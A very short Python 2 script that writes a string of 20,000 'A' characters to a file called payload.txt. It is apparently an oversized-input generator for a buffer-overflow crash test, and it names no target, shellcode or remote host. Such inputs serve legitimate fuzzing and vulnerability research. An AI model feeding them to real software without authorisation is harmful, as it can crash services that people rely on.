#!/usr/bin/python

f = file('payload.txt','w')

payload = "A" * 20000

f.write(payload)
f.close()

